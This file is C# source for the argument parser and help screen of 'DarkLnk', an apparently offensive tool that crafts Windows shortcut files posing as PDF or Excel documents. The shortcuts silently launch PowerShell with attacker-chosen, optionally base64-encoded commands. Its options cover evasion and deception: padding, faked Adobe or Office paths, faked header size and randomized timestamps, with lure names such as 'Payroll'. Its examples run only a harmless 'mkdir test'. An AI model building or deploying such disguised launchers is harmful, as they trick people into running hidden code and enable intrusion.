using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DarkLnk
{
    public class Entry
    {
        public static DarkLnk dl = new DarkLnk();

        static void Main(string[] args)
        {
            ParseArgs(args);
            dl.BuildLink();
        }

        public static void ParseArgs(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                try
                {
                    if (args[i] == "-ext") { dl.LinkExtension = args[i + 1]; }
                    if (args[i] == "-o") { dl.OutputName = args[i + 1]; }
                    if (args[i] == "-padnull") { dl.NullPadding = true; }
                    if (args[i] == "-padrand") { dl.RandomPadding = true; }
                    if (args[i] == "-fakeroot") { dl.RootDirectory = args[i + 1]; }
                    if (args[i] == "-fakesize") { dl.LinkSize = Convert.ToInt32(args[i + 1]); }
                    if (args[i] == "-fakepath") { dl.LinkPath = args[i + 1]; }
                    if (args[i] == "-faketime") { dl.FakeTime = true; }
                    if (args[i] == "-bin") { dl.Binary = args[i + 1]; }



                    if (args[i] == "-args") { dl.Command = args[i + 1]; }
                    if (args[i] == "-argsb64") { dl.Command = Encoding.UTF8.GetString(Convert.FromBase64String(args[i + 1])); }
                    if (args[i] == "-h") { ShowHelp(); }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error parsing arguments: {ex.Message}");
                    ShowHelp();
                }
            }

        }

        public static void ShowHelp()
        {
            Console.WriteLine(@"**********************************************");
            Console.WriteLine(@"*   ____             _    _           _      *");
            Console.WriteLine(@"*  |  _ \  __ _ _ __| | _| |    _ __ | | __  *");
            Console.WriteLine(@"*  | | | |/ _` | '__| |/ / |   | '_ \| |/ /  *");
            Console.WriteLine(@"*  | |_| | (_| | |  |   <| |___| | | |   <   *");
            Console.WriteLine(@"*  |____/ \__,_|_|  |_|\_\_____|_| |_|_|\_\  *");
            Console.WriteLine(@"*                                            *");
            Console.WriteLine(@"**********************************************");
            Console.WriteLine();

            Console.WriteLine(@"[Primary Arguments]");
            Console.WriteLine(@" -ext       | The fake extension you want to emulate. e.g. pdf (default), xls, docx");
            Console.WriteLine(@" -args      | The arguments to send the executable.");
            
            Console.WriteLine();

            Console.WriteLine(@"[Optional Arguments]");
            Console.WriteLine(@" -o         | The name of the lnk file created. Default: 'calc'");
            Console.WriteLine(@" -argsb64   | The arguments to send the executable. Use this if you have spaces or quotes (Base64 Encoded)");
            Console.WriteLine(@" -bin       | Change binary to call. Default: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'");
            Console.WriteLine(@"              **Only PowerShell seems to work. You are welcome to try other binaries if you wish**");
            Console.WriteLine();

            Console.WriteLine(@"[Optional Obfuscation Techniques]");
            Console.WriteLine(@" -padnull   | Pad non-important areas with null bytes of random size.");
            Console.WriteLine(@" -padrand   | Pad non-important areas with random bytes of random size.");
            Console.WriteLine(@" -fakeroot  | Define root dir of target. Default: 'C:\'");
            Console.WriteLine(@" -fakesize  | Define link size in header. Default: Int32.Max");
            Console.WriteLine(@" -fakepath  | Fake path. Default: 'Program Files\Adobe\Acrobat'");
            Console.WriteLine(@" -faketime  | Randomize date/time fields in the header.");
            Console.WriteLine();

            Console.WriteLine(" Examples:");
            Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -argsb64 LWNvbW1hbmQgIm1rZGlyICJ0ZXN0IiI=");
            Console.WriteLine(@" DarkLnk.exe -o Report -ext pdf -args ""-command mkdir test""");
            Console.WriteLine(@" DarkLnk.exe -o Payroll -ext xlsx -args ""mkdir test"" -padrand -faketime -fakepath ""Microsoft Office 365""");
            Environment.Exit(0);
        }


    }


}
